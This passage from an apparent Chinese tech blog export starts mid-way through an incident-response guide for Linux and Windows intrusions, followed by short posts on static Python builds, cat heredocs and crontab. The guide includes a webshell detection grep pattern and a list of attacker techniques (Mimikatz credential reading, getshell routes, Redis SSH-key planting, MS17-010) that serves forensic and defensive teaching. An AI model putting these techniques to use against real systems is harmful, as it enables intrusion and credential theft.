使用last命令，用于显示用户最近登录信息（数据源为/var/log/wtmp，var/log/btmp） ​ utmp文件中保存的是当前正在本系统中的用户的信息。 ​ wtmp文件中保存的是登录过本系统的用户的信息。 ​ /var/log/wtmp 文件结构和/var/run/utmp 文件结构一样，都是引用/usr/include/bits/utmp.h 中的struct utmp 系统路径分析 a) echo $PATH 分析有无敏感可疑信息 指定信息检索 a) strings命令在对象文件或二进制文件中查找可打印的字符串 b) 分析sshd 文件，是否包括IP信息strings /usr/bin/.sshd | egrep &#39;[1-9]{1,3}.[1-9]{1,3}.&#39; PS：此正则不严谨，但匹配IP已够用 c) 根据关键字匹配命令内是否包含信息（如IP地址、时间信息、远控信息、木马特征、代号名称） 查看ssh相关目录有无可疑的公钥存在。 a) Redis（6379） 未授权恶意入侵，即可直接通过redis到目标主机导入公钥。 b) 目录： /etc/ssh ./.ssh/ 3.1.4 后门排查除以上文件、进程、系统 分析外，推荐工具： ​ chkrootkit rkhunter（www.chkrootkit.org rkhunter.sourceforge.net） Ø chkrootkit (迭代更新了20年)主要功能： 检测是否被植入后门、木马、rootkit 检测系统命令是否正常 检测登录日志 详细参考README Ø rkhunter主要功能： 系统命令（Binary）检测，包括Md5 校验 Rootkit检测 本机敏感目录、系统配置、服务及套间异常检测 三方应用版本检测 Ø RPM check检查 系统完整性也可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查 ./rpm -Va &gt; rpm.log 如果一切均校验正常将不会产生任何输出。如果有不一致的地方，就会显示出来。输出格式是8位长字符串, c 用以指配置文件, 接着是文件名. 8位字符的每一个 用以表示文件与RPM数据库中一种属性的比较结果 。 . (点) 表示测试通过。.下面的字符表示对RPM软件包进行的某种测试失败： 5 MD5 校验码S 文件尺寸L 符号连接T 文件修改日期D 设备U 用户G 用户组M 模式e (包括权限和文件类型) 借用sobug文章案例：如下图可知ps, pstree, netstat, sshd等等系统关键进程被篡改了 Ø Webshell查找 ​ Webshell的排查可以通过文件、流量、日志三种方式进行分析，基于文件的命名特征和内容特征，相对操作性较高，在入侵后应急过程中频率也比较高。 可根据webshell特征进行命令查找，简单的可使用(当然会存在漏报和误报) find /var/www/ -name &quot;.php&quot; |xargs egrep &#39;assert|phpspy|c99sh|milw0rm|eval|(gunerpress|(base64_decoolcode|spider_bc|shell_exec|passthru|(\\$\\_\\POST[|eval (str_rot13|.chr(|\\${\\&quot;\\_P|eval(\\$\\_R|file_put_contents(.\\\\$\\_|base64_decode&#39; Webshell的排查可以通过 Github上存在各种版本的webshell查杀脚本，当然都有自己的特点，可使用河马shell查杀（shellpub.com） 综上所述，通过chkrootkit 、rkhunter、RPM check、Webshell Check 等手段得出以下应对措施： 根据进程、连接等信息关联的程序，查看木马活动信息。 假如系统的命令（例如netstat ls 等）被替换，为了进一步排查，需要下载一新的或者从其他未感染的主机拷贝新的命令。 发现可疑可执行的木马文件，不要急于删除，先打包备份一份。 发现可疑的文本木马文件，使用文本工具对其内容进行分析，包括回连IP地址、加密方式、关键字（以便扩大整个目录的文件特征提取）等。 3.1.5 日志分析 ​ 日志文件 /var/log/message 包括整体系统信息 /var/log/auth.log 包含系统授权信息，包括用户登录和使用的权限机制等 /var/log/userlog 记录所有等级用户信息的日志。 /var/log/cron 记录crontab命令是否被正确的执行 /var/log/xferlog(vsftpd.log)记录Linux FTP日志 /var/log/lastlog 记录登录的用户，可以使用命令lastlog查看 /var/log/secure 记录大多数应用输入的账号与密码，登录成功与否 var/log/wtmp 记录登录系统成功的账户信息，等同于命令last var/log/faillog 记录登录系统不成功的账号信息，一般会被黑客删除 1.日志查看分析，grep,sed,sort,awk综合运用 2.基于时间的日志管理： /var/log/wtmp /var/run/utmp /var/log/lastlog(lastlog) /var/log/btmp(lastb) 3.登录日志可以关注Accepted、Failed password 、invalid特殊关键字 4.登录相关命令 ​ lastlog 记录最近几次成功登录的事件和最后一次不成功的登录 who 命令查询utmp文件并报告当前登录的每个用户。Who的缺省输出包括用户名、终端类型、登录日期及远程主机 w 命令查询utmp文件并显示当前系统中每个用户和它所运行的进程信息 users 用单独的一行打印出当前登录的用户，每个显示的用户名对应一个登录会话。如果一个用户有不止一个登录会话，那他的用户名把显示相同的次数 last 命令往回搜索wtmp来显示自从文件第一次创建以来登录过的用户 finger 命令用来查找并显示用户信息，系统管理员通过使用该命令可以知道某个时候到底有多少用户在使用这台Linux主机。 5.几个语句​ 定位有多少IP在爆破主机的root帐号 grep &quot;Failed password for root&quot; /var/log/auth.log | awk &#39;{print $11}&#39; | sort | uniq -c | sort -nr | more 登录成功的IP有哪些 grep &quot;Accepted &quot; /var/log/auth.log | awk &#39;{print $11}&#39; | sort | uniq -c | sort -nr | more tail -400f demo.log #监控最后400行日志文件的变化 等价与 tail -n 400 -f （-f参数是实时） less demo.log #查看日志文件，支持上下滚屏，查找功能 uniq -c demo.log #标记该行重复的数量，不重复值为1 grep -c &#39;ERROR&#39; demo.log #输出文件demo.log中查找所有包行ERROR的行的数量 3.1.6 相关处置 kill -9 chattr –i rm setfacl ssh chmod 3.2 Windows系列分析排查 3.2.1 文件分析 1.开机启动有无异常文件 2.各个盘下的temp(tmp)相关目录下查看有无异常文件 3.浏览器浏览痕迹、浏览器下载文件、浏览器cookie信息 4.查看文件时间，创建时间、修改时间、访问时间。对应linux的ctime mtime atime，通过对文件右键属性即可看到详细的时间（也可以通过dir /tc 1.aspx 来查看创建时间），黑客通过菜刀类工具改变的是修改时间。所以如果修改时间在创建时间之前明显是可疑文件。 5.查看用户recent相关文件，通过分析最近打开分析可疑文件 a) C:\\Documents and Settings\\Administrator\\Recent b) C:\\Documents and Settings\\Default User\\Recent c) 开始,运行 %UserProfile%\\Recent 6.根据文件夹内文件列表时间进行排序，查找可疑文件。当然也可以搜索指定日期范围的文件及文件件 Server 2008 R2系列 Win10 系列 7.关键字匹配，通过确定后的入侵时间，以及webshell或js文件的关键字（比如博彩类），可以在IIS 日志中进行过滤匹配，比如经常使用: 8. 知道是上传目录，在web log 中查看指定时间范围包括上传文件夹的访问请求 findstr /s /m /I “UploadFiles” .log 某次博彩事件中的六合彩信息是six.js findstr /s /m /I “six.js” .aspx 根据shell名关键字去搜索D盘spy相关的文件有哪些 for /r d:\\ %i in (spy.aspx) do @echo %i 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485##### 3.2.2 进程命令1.netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED2.根据netstat 定位出的pid，再通过tasklist命令进行进程定位![](/images/2017-12-05/593bbbe4131e9.jfif)3.通过tasklist命令查看可疑程序##### 3.2.3 系统信息1.使用set命令查看变量的设置2.Windows 的计划任务；3.Windows 的帐号信息，如隐藏帐号等4.配套的注册表信息检索查看，SAM文件以及远控软件类5.查看systeminfo 信息，系统版本以及补丁信息 例如系统的远程命令执行漏洞MS08-067、MS09-001、MS17-010（永恒之蓝）… 若进行漏洞比对，建议使用Windows-Exploit-Suggester https://github.com/GDSSecurity/Windows-Exploit-Suggester/3.2.4 后门排查PC Hunter是一个Windows系统信息查看软件http://www.xuetr.com/功能列表如下：1.进程、线程、进程模块、进程窗口、进程内存信息查看，杀进程、杀线程、卸载模块等功能2.内核驱动模块查看，支持内核驱动模块的内存拷贝3.SSDT、Shadow SSDT、FSD、KBD、TCPIP、Classpnp、Atapi、Acpi、SCSI、IDT、GDT信息查看，并能检测和恢复ssdt hook和inline hook4.CreateProcess、CreateThread、LoadImage、CmpCallback、BugCheckCallback、Shutdown、Lego等Notify Routine信息查看，并支持对这些Notify Routine的删除5.端口信息查看，目前不支持2000系统6.查看消息钩子7.内核模块的iat、eat、inline hook、patches检测和恢复8.磁盘、卷、键盘、网络层等过滤驱动检测，并支持删除9.注册表编辑10.进程iat、eat、inline hook、patches检测和恢复11.文件系统查看，支持基本的文件操作12.查看（编辑）IE插件、SPI、启动项、服务、Host文件、映像劫持、文件关联、系统防火墙规则、IME13.ObjectType Hook检测和恢复14.DPC定时器检测和删除15.MBR Rootkit检测和修复16.内核对象劫持检测17.WorkerThread枚举18.Ndis中一些回调信息枚举19.硬件调试寄存器、调试相关API检测20.枚举SFilter/Fltmgr的回调PS：最简单的使用方法，根据颜色去辨识——可疑进程，隐藏服务、被挂钩函数：红色，然后根据程序右键功能去定位具体的程序和移除功能。根据可疑的进程名等进行互联网信息检索然后统一清除并关联注册表。![](/images/2017-12-05/593bbbe631c6a.jfif)Webshell 排查1.可以使用hm![](/images/2017-12-05/593bbbe892ce1.jfif)2.也可以使用盾类（D盾、暗组盾），如果可以把web目录导出，可以在自己虚拟机进行分析##### 3.2.5 日志分析1.打开事件管理器（开始—管理工具—事件查看/开始运行eventvwr）2.主要分析安全日志，可以借助自带的筛选功能![](/images/2017-12-05/593bbbea5fc7c.jfif)![](/images/2017-12-05/593bbbec097aa.jfif)![](/images/2017-12-05/593bbbedcf394.jfif)3.可以把日志导出为文本格式，然后使用notepad++ 打开，使用正则模式去匹配远程登录过的IP地址，在界定事件日期范围的基础，可以提高效率正则是： 4. ((?:(?:25[0-5]|2[0-4]\\d|((1\\d&#123;2&#125;)|([1-9]?\\d))).)&#123;3&#125;(?:25[0-5]|2[0-4]\\d|((1\\d&#123;2&#125;)|([1-9]?\\d)))) 强大的日志分析工具Log Parser #分析IIS日志LogParser.exe &quot;select top 10 time, c-ip,cs-uri-stem, sc-status, time-taken from C:\\Users\\sm0nk\\Desktop\\iis.log&quot; -o:datagrid 有了这些我们就可以对windows日志进行分析了 比如我们分析域控日志的时候，想要查询账户登陆过程中，用户正确，密码错误的情况，我们需要统计出源IP，时间，用户名时，我们可以这么写（当然也可以结合一些统计函数，分组统计等等）：LogParser.exe -i:EVT &quot;SELECT TimeGenerated,EXTRACT\\_TOKEN(Strings,0,&#39;|&#39;) AS USERNAME,EXTRACT\\_TOKEN(Strings,2,&#39;|&#39;) AS SERVICE\\_NAME,EXTRACT\\_TOKEN(Strings,5,&#39;|&#39;) AS Client_IP FROM &#39;e:\\logparser\\xx.evtx&#39; WHERE EventID=675&quot; 事件ID是很好的索引 Windows server 2008系列参考event ID：4624 - 帐户已成功登录4625 - 帐户登录失败4648 - 试图使用明确的凭证登录（例如远程桌面） 3.2.6 相关处置 1.通过网络连接锁定的可疑进程，进行定位恶意程序后删除(taskkill) 2.木马查杀，可配合pchunter 进行进一步专业分析，使用工具功能进行强制停止以及删除 3.最后清理后，统一查看网络连接、进程、内核钩子等是否正常。 3.3 应用类 Apache、tomcat、Nginx、IIS 无论任何web服务器其实日志需要关注的东西是一致的，即access_log和error_log。一般在确定ip地址后，通过: find . access_log |grep xargs ip攻击地址 find . access_log| grep xargs 木马文件名 页面访问排名前十的IPcat access.log | cut -f1 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10页面访问排名前十的URLcat access.log | cut -f4 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10查看最耗时的页面cat access.log | sort -k 2 -n -r | head 10 在对WEB日志进行安全分析时，可以按照下面两种思路展开，逐步深入，还原整个攻击过程。 1.首先确定受到攻击、入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。 2.一般攻击者在入侵网站后，通常会上传一个后门文件，以方便自己以后访问。我们也可以以该文件为线索来展开分析。 4 应急总结 1.核心思路是“顺藤摸瓜” 2.碎片信息的关联分析 3.时间范围的界定以及关键操作时间点串联 4.Web入侵类，shell定位很重要 5.假设与求证 6.攻击画像与路线确认 5 渗透反辅 1.密码读取 a) Windows: Mimikatz b) Linux: mimipenguin 2.帐号信息 a) 操作系统帐号 b) 数据库帐号 c) 应用帐号信息 3.敏感信息 a) 配置信息 b) 数据库信息 c) 服务端口信息 d) 指纹信息 4.滚雪球式线性拓展 a) 密码口令类拓展（远控） b) 典型漏洞批量利用 5.常见的入侵方式Getshell方法 a) WEB入侵 ​ i. 典型漏洞：注入Getshell , 上传Getshell，命令执行Getshell，文件包含Getshell，代码执行Getshell，编辑器getshell，后台管理Getshell，数据库操作Getshell ​ ii. 容器相关：Tomcat、Axis2、WebLogic等中间件弱口令上传war包等，Websphere、weblogic、jboss反序列化，Struts2代码执行漏洞，Spring命令执行漏洞 b) 系统入侵 ​ i. SSH 破解后登录操作 ​ ii. RDP 破解后登录操作 ​ iii. MSSQL破解后远控操作 ​ iv. SMB远程命令执行（MS08-067、MS17-010、CVE-2017-7494） c) 典型应用 ​ i. Mail暴力破解后信息挖掘及漏洞利用 ​ ii. VPN暴力破解后绕过边界 ​ iii. Redis 未授权访问或弱口令可导ssh公钥或命令执行 ​ iv. Rsync 未授权访问类 ​ v. Mongodb未授权访问类 ​ vi. Elasticsearch命令执行漏洞 ​ vii. Memcache未授权访问漏洞 ​ viii. 服务相关口令（mysql ldap zebra squid vnc smb） 6 资源参考 https://www.waitalone.cn/linux-find-webshell.html http://vinc.top/category/yjxy/ http://www.shellpub.com/ http://linux.vbird.org/linux_security/0420rkhunter.php https://cisofy.com/download/lynis/ https://sobug.com/article/detail/27?from=message&amp;isappinstalled=1 http://www.freebuf.com/articles/web/23358.html https://www.microsoft.com/en-us/download/details.aspx?id=24659 http://www.cnblogs.com/downmoon/archive/2009/09/02/1558409.html http://wooyun.jozxing.cc/static/drops/tips-7462.html http://bobao.360.cn/learning/detail/3830.html https://yq.aliyun.com/ziliao/65679 http://secsky.sinaapp.com/188.html http://blog.sina.com.cn/s/blog_d7058b150102wu07.html http://www.sleuthkit.org/autopsy/ 7 FAQ 1.应急需求有哪些分类： a) 被谁入侵了？ 关联 攻击IP 攻击者信息 b) 怎么入侵的？ 关联 入侵时间轴、漏洞信息 c) 为什么被入侵？ 关联 行业特性、数据信息、漏洞信息 d) 数据是否被窃取？ 关联 日志审计 e) 怎么办？ 关联 隔离、排查分析、删马（解密）、加固、新运营 2.关于windows的日志工具（log parser）有无图形界面版？ Log Parser Lizard 是一款用Vc++.net写的logParser增强工具。主要有以下特点： a) 封装了logParser命令，带图形界面，大大降低了LogParser的使用难度。 b) 集成了几个开源工具，如log4net等。可以对IIS logs\\EventLogs\\active directory\\log4net\\File Systems\\T-SQL进行方便的查询。 c) 集成了Infragistics.UltraChart.Core.v4.3、Infragistics.Excel.v4.3.dll等，使查询结果可以方便的以图表或E. XCEL格式展示。 d) 集成了常见的查询命令，范围包含六大模块:IIS e) 可以将查询过的命令保存下来，方便再次使用。 PS:软件是比较老的，对新系统兼容性不好，还是建议微软原生态log parser 3.在linux日志中，有无黑客入侵后的操作命令的统计\\ a) 可以根据history信息进行溯源分析，但一般可能会被清除 b) 还有方法是需要结合accton 和 lastcomm \\4. 3.2.3 提到了Windows-Exploit-Suggester，有无linux版？ Linux_Exploit_Suggester https://github.com/PenturaLabs/Linux_Exploit_Suggester 5.有无linux自动化信息收集的脚本工具？ LinEnum https://github.com/rebootuser/LinEnum 6. 7.有无综合的取证分析工具 Autopsy 是sleuthkit提供的平台工具，Windows 和 Linux磁盘映像静态分析、恢复被删文件、时间线分析，网络浏览历史，关键字搜索和邮件分析等功能 http://www.sleuthkit.org/autopsy/ 8.关于业务逻辑的排查方法说明 新型业务安全中安全事件，例如撞库、薅羊毛、支付、逻辑校验等敏感环节，未在本文体现，所以后续有必要针对业务侧的应急排查方法归纳。 雷锋网再次声明：本文作者sm0nk@猎户攻防实验室，雷锋网宅客频道授权转载，先知技术社区拥有全部内容版权。媒体或商业转载必须获得授权，违者必追究法律责任。 雷锋网版权文章，未经授权禁止转载。","tags":[{"name":"运营","slug":"运营","permalink":"http://yoursite.com/tags/运营/"}]},{"title":"python静态编译","date":"2017-12-04T17:09:50.000Z","path":"2017/12/05/python静态编译/","text":"0. 前言为什么要将python编译器静态编译，主要有以下几个目的： 在其他不具备python环境下的主机上运行python程序 在不具备相同python库的主机上运行python程序 1. 工具集到目前为止我找到了两个工具集合： 1.1 静态编译的python解释器这是pts大佬的一个工程 https://github.com/pts/staticpython ， 在该工程中，大佬给出了静态编译脚本，以及最终的release版本！ 1.2 结合cython的静态解释器这个工程也十分庞大，作者结合http://mdqinc.com/blog/2011/08/statically-linking-python-with-cython-generated-modules-and-packages/ 这篇文章的思路，完成了static-python 这个工程。 该工程需要用户根据需求，自行设置静态编译后的解释器所包含的库内容！（由于没有实测，只是觉得这样做不太友好，而且中间应该会有不少bug） 但是该工程有一个及其牛逼之处，就是它可以根据独立的py脚本，生成该脚本的静态编译后的二进制文件。 2. 自行编译对于python解释器的编译，我做了N多次实验，但是基本上没有一次成功的。很多时候会缺少某些库文件，甚至有时编译都通不过。所以，这儿仅结合所看到的一些文章，给出一定的猜想。 2.1 实验环境docker + centos:6 + python-2.7.6.tgz 2.2 实验参考文献https://gist.github.com/ajdavis/9632280 https://blog.fluyy.net/post/2016-01-09-static_python https://wiki.python.org/moin/BuildStatically https://askubuntu.com/questions/63711/building-a-static-version-of-python http://xiaoxia.org/2013/09/13/python-on-tomato/ https://codeday.me/bug/20170923/75551.html 2.3 实验步骤2.3.1 安装镜像源用docker运行centos:6的环境 宿主机：docker run -it --net=&quot;host&quot; -d centos:6 宿主机：docker exec -it container-id /bin/bash 安装镜像源 宿主机：wget -O CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo 宿主机：docker cp CentOS-Base.repo container-id:/etc/yum.repos.d/CentOS-Base.repo 容器：yum makecache 2.3.2 软件安装安装基本软件wget、vi等(视情况而定) 安装必要软件glibc-static zlib-static 容器：yum install glibc-static zlib-static 2.3.3 编译在配置之前，我们需要修改Modules/Setup文件： 12#*shared* 注释掉这一行*static* 添加这一行 编译 容器：./configure --disable-shared --enable-profiling --prefix=/path/to/mypy LDFLAGS=&quot;-static -static-libgcc&quot; CPPFLAGS=&quot;-static&quot; 容器：make 这个过程会出现问题 1/usr/bin/ld: dynamic STT_GNU_IFUNC symbol strcmp&apos; with pointer equality in/usr/lib/gcc/x86_64-redhat-linux/4.4.7/../../../../lib64/libc.a(strcmp.o)&apos; can not be used when making an executable; recompile with -fPIE and relink with -pie 说实在的，网上没有一篇文章提到如何解决这个问题，所以这个地方我不管了！ 我直接做 1gcc -pthread -static -static-libgcc -o python.exe Modules/python.o libpython2.7.a -lpthread -ldl -lutil -lm -lz 2.3.4 排错上述操作完成之后，确确实实会出现python.exe文件，但是我们运行的时候，会报错： 1234567891011121314151617181920Could not find platform dependent libraries &lt;exec_prefix&gt;Consider setting $PYTHONHOME to &lt;prefix&gt;[:&lt;exec_prefix&gt;]Traceback (most recent call last): File &quot;/root/Python-2.7.6/Lib/site.py&quot;, line 548, in &lt;module&gt; main() File &quot;/root/Python-2.7.6/Lib/site.py&quot;, line 530, in main known_paths = addusersitepackages(known_paths) File &quot;/root/Python-2.7.6/Lib/site.py&quot;, line 266, in addusersitepackages user_site = getusersitepackages() File &quot;/root/Python-2.7.6/Lib/site.py&quot;, line 241, in getusersitepackages user_base = getuserbase() # this will also set USER_BASE File &quot;/root/Python-2.7.6/Lib/site.py&quot;, line 231, in getuserbase USER_BASE = get_config_var(&apos;userbase&apos;) File &quot;/root/Python-2.7.6/Lib/sysconfig.py&quot;, line 517, in get_config_var return get_config_vars().get(name) File &quot;/root/Python-2.7.6/Lib/sysconfig.py&quot;, line 469, in get_config_vars _init_posix(_CONFIG_VARS) File &quot;/root/Python-2.7.6/Lib/sysconfig.py&quot;, line 352, in _init_posix from _sysconfigdata import build_time_varsImportError: No module named _sysconfigdata 没有发现\\_sysconfigdata.py文件！原因是因为，编译的时候没有正确通过，所以不是产生\\_sysconfigdata.py文件！（是不是觉得这个问题是个死结。。。） 解决办法一： Lib/_sysconfig.py 1234def _init_posix(vars): #from _sysconfigdata import build_time_vars #注释掉 #vars.update(build_time_vars) #注释掉 pass #添加pass Lib/distuyils/sysconfig.py 12345def _init_posix(): #from _sysconfigdata import build_time_vars #注释掉 global _config_vars _config_vars = &#123;&#125; #_config_vars.update(build_time_vars) #注释掉 解决办法二： 找到一个已经编译好的python文件，找到其中的_sysconfig.py文件，直接将其拷贝至实验环境中。 解决办法一，虽然可以让python.exe顺利执行，但是所有包管理都不会成功，这是因为build_time_vars中有一些环境设置，这个是找到对应的包文件的重要凭据。 解决办法二，虽然这个办法看起来靠谱，但是这里忽略了对_sysconfigdata.py中build_time_vars字典的理解与修改过程。这个任务也挺复杂的，所以我没来得及做。","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"cat命令输出多行至文件","date":"2017-12-03T18:07:50.000Z","path":"2017/12/04/cat命令输出多行至文件/","text":"一、cat和EOFcat命令是linux下的一个文本输出命令，通常是用于观看某个文件的内容的；EOF是“end of file”，表示文本结束符。结合这两个标识，即可避免使用多行echo命令的方式，并实现多行输出的结果。 二、使用看例子是最快的熟悉方法： 1234# cat &lt;&lt; EOF &gt; test.sh&gt; #!/bin/bash&gt; #you Shell script writes here.&gt; EOF","tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"crontab指令介绍","date":"2017-11-26T03:58:03.000Z","path":"2017/11/26/crontab指令介绍/","text":"at 命令是针对仅运行一次的任务，循环运行的例行性计划任务，linux系统则是由 cron (crond) 这个系统服务来控制的。Linux 系统上面原本就有非常多的计划性工作，因此这个系统服务是默认启动的。另外, 由于使用者自己也可以设置计划任务，所以， Linux 系统也提供了使用者控制计划任务的命令 :crontab 命令。 一、crond简介crond是linux下用来周期性的执行某种任务或等待处理某些事件的一个守护进程，与windows下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动crond进程，crond进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。 Linux下的任务调度分为两类，系统任务调度和用户任务调度。 系统任务调度：系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。在/etc目录下有一个crontab文件，这个就是系统任务调度的配置文件。 /etc/crontab文件包括下面几行： 12345678910[root@localhost ~]# cat /etc/crontab SHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=\"\"HOME=/# run-parts51 * * * * root run-parts /etc/cron.hourly24 7 * * * root run-parts /etc/cron.daily22 4 * * 0 root run-parts /etc/cron.weekly42 4 1 * * root run-parts /etc/cron.monthly 前四行是用来配置crond任务运行的环境变量，第一行SHELL变量指定了系统要使用哪个shell，这里是bash，第二行PATH变量指定了系统执行命令的路径，第三行MAILTO变量指定了crond的任务执行信息将通过电子邮件发送给root用户，如果MAILTO变量的值为空，则表示不发送任务执行信息给用户，第四行的HOME变量指定了在执行命令或者脚本时使用的主目录。第六至九行表示的含义将在下个小节详细讲述。这里不在多说。 用户任务调度：用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。用户可以使用 crontab 工具来定制自己的计划任务。所有用户定义的crontab 文件都被保存在 /var/spool/cron目录中。其文件名与用户名一致。 使用者权限文件： 文件：/etc/cron.deny 说明：该文件中所列用户不允许使用crontab命令 文件：/etc/cron.allow 说明：该文件中所列用户允许使用crontab命令 文件：/var/spool/cron/ 说明：所有用户crontab文件存放的目录,以用户名命名 crontab文件的含义： 用户所建立的crontab文件中，每一行都代表一项任务，每行的每个字段代表一项设置，它的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，格式如下： minute hour day month week command 其中： minute： 表示分钟，可以是从0到59之间的任何整数。 hour：表示小时，可以是从0到23之间的任何整数。 day：表示日期，可以是从1到31之间的任何整数。 month：表示月份，可以是从1到12之间的任何整数。 week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。 command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。 ​ 在以上各个字段中，还可以使用以下特殊字符： 星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。 逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9” 中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6” 正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。同时正斜线可以和星号一起使用，例如*/10，如果用在minute字段，表示每十分钟执行一次。 二、crond服务安装crontab: yum install crontabs 服务操作说明： /sbin/service crond start //启动服务/sbin/service crond stop //关闭服务/sbin/service crond restart //重启服务/sbin/service crond reload //重新载入配置 查看crontab服务状态： service crond status 手动启动crontab服务： service crond start 查看crontab服务是否已设置为开机启动，执行命令： ntsysv 加入开机自动启动： chkconfig –level 35 crond on 三、crontab命令详解1．命令格式： crontab [-u user] file crontab [-u user][ -e | -l | -r ] 2．命令功能：通过crontab 命令，我们可以在固定的间隔时间执行指定的系统指令或 shell script脚本。时间间隔的单位可以是分钟、小时、日、月、周及以上的任意组合。这个命令非常设合周期性的日志分析或数据备份等工作。 3．命令参数：-u user：用来设定某个用户的crontab服务，例如，“-u ixdba”表示设定ixdba用户的crontab服务，此参数一般有root用户来运行。 file：file是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab。 -e：编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件。 -l：显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容。 -r：从/var/spool/cron目录中删除某个用户的crontab文件，如果不指定用户，则默认删除当前用户的crontab文件。 -i：在删除用户的crontab文件时给确认提示。 4．常用方法：1). 创建一个新的crontab文件在考虑向cron进程提交一个crontab文件之前，首先要做的一件事情就是设置环境变量EDITOR。cron进程根据它来确定使用哪个编辑器编辑crontab文件。9 9 %的UNIX和LINUX用户都使用vi，如果你也是这样，那么你就编辑$ HOME目录下的.profile文件，在其中加入这样一行： EDITOR=vi; export EDITOR 然后保存并退出。不妨创建一个名为 cron的文件，其中是用户名，例如， davecron。在该文件中加入如下的内容。 123# (put your own initials here)echo the date to the console every# 15minutes between 6pm and 6am0,15,30,45 18-06 * * * /bin/echo &apos;date&apos; &gt; /dev/console 保存并退出。确信前面5个域用空格分隔。 在上面的例子中，系统将每隔1 5分钟向控制台输出一次当前时间。如果系统崩溃或挂起，从最后所显示的时间就可以一眼看出系统是什么时间停止工作的。在有些系统中，用tty1来表示控制台，可以根据实际情况对上面的例子进行相应的修改。为了提交你刚刚创建的crontab文件，可以把这个新创建的文件作为cron命令的参数： $ crontab davecron 现在该文件已经提交给cron进程，它将每隔1 5分钟运行一次。 同时，新创建文件的一个副本已经被放在/var/spool/cron目录中，文件名就是用户名(即dave)。 2). 列出crontab文件 为了列出crontab文件，可以用： $ crontab -l 0,15,30,45,18-06 * /bin/echo date &gt; dev/tty1 你将会看到和上面类似的内容。可以使用这种方法在$ H O M E目录中对crontab文件做一备份： \\$ crontab -l &gt; $HOME/mycron ​ 这样，一旦不小心误删了crontab文件，可以用上一节所讲述的方法迅速恢复。 3). 编辑crontab文件 如果希望添加、删除或编辑crontab文件中的条目，而editor环境变量又设置为vi，那么就可以用vi来编辑crontab文件，相应的命令为： $ crontab -e 可以像使用vi编辑其他任何文件那样修改crontab文件并退出。如果修改了某些条目或添加了新的条目，那么在保存该文件时， c r o n会对其进行必要的完整性检查。如果其中的某个域出现了超出允许范围的值，它会提示你。 我们在编辑crontab文件时，没准会加入新的条目。例如，加入下面的一条： 12# DT:delete core files,at 3.30am on 1,7,14,21,26,26 days of each month30 3 1,7,14,21,26 * * /bin/find -name &quot;core&apos; -exec rm &#123;&#125; \\; 现在保存并退出。最好在crontab文件的每一个条目之上加入一条注释，这样就可以知道它的功能、运行时间，更为重要的是，知道这是哪位用户的作业。 现在让我们使用前面讲过的crontab -l命令列出它的全部信息： 123456$ crontab -l # (crondave installed on Tue May 4 13:07:43 1999)# DT:ech the date to the console every 30 minites0,15,30,45 18-06 * * * /bin/echo date &gt; /dev/tty1# DT:delete core files,at 3.30am on 1,7,14,21,26,26 days of each month30 3 1,7,14,21,26 * * /bin/find -name &quot;core&apos; -exec rm &#123;&#125; \\; 4). 删除crontab文件要删除crontab文件，可以用： $ crontab -r 5). 恢复丢失的crontab文件如果不小心误删了crontab文件，假设你在自己的$ H O M E目录下还有一个备份，那么可以将其拷贝到/var/spool/cron/username，其中username是用户名。如果由于权限问题无法完成拷贝，可以用： $ crontab filename ​ 其中，filename是你在$HOME目录中副本的文件名。 我建议你在自己的$HOME目录中保存一个该文件的副本。我就有过类似的经历，有数次误删了crontab文件（因为r键紧挨在e键的右边）。这就是为什么有些系统文档建议不要直接编辑crontab文件，而是编辑该文件的一个副本，然后重新提交新的文件。 有些crontab的变体有些怪异，所以在使用crontab命令时要格外小心。如果遗漏了任何选项，crontab可能会打开一个空文件，或者看起来像是个空文件。这时敲delete键退出，不要按\\&lt;Ctrl-D>，否则你将丢失crontab文件。 5．使用实例实例1：每1分钟执行一次command 命令：* * * * * command 实例2：每小时的第3和第15分钟执行 命令：3,15 * * * * command 实例3：在上午8点到11点的第3和第15分钟执行 命令：3,15 8-11 * * * command 实例4：每隔两天的上午8点到11点的第3和第15分钟执行 命令：3,15 8-11 */2 * * command 实例11：每一小时重启smb 命令：* */1 * * * /etc/init.d/smb restart 实例12：晚上11点到早上7点之间，每隔一小时重启smb 命令：* 23-7/1 * * * /etc/init.d/smb restart 实例15：每小时执行/etc/cron.hourly目录内的脚本 命令：01 * * * * root run-parts /etc/cron.hourly 说明： run-parts这个参数了，如果去掉这个参数的话，后面就可以写要运行的某个脚本名，而不是目录名了 四、使用注意事项 注意环境变量问题 有时我们创建了一个crontab，但是这个任务却无法自动执行，而手动执行这个任务却没有问题，这种情况一般是由于在crontab文件中没有配置环境变量引起的。 